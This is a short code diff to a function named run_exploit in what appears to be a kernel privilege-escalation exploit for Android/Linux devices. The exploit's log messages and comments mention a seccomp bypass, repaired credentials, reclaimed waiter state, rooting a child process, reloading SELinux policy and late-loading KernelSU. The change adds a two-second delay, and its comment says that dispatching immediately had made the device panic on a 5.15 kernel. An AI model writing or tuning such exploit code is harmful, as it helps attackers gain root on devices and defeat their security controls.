@@ -1422,7 +1422,11 @@ int run_exploit(int argc, char **argv) {
   if (!seccomp_ok)
     pr_warning("W3 seccomp bypass failed after 3 chain rounds; ksud late-load will likely stay blocked\n");
 
-  /* Dispatch policy recovery immediately after W2. */
+  /* Let the repaired credential and reclaimed waiter state settle before the
+   * rooted child reloads SELinux policy and late-loads KernelSU.  Dispatching
+   * immediately regressed the proven 5.15 path: KernelSU loaded, then init
+   * exited during policy recovery and the device panicked. */
+  sleep(2);
   TIMER("exploit complete");
   if (!ever_rooted) {
     pr_error("w2 never rooted a child\n");
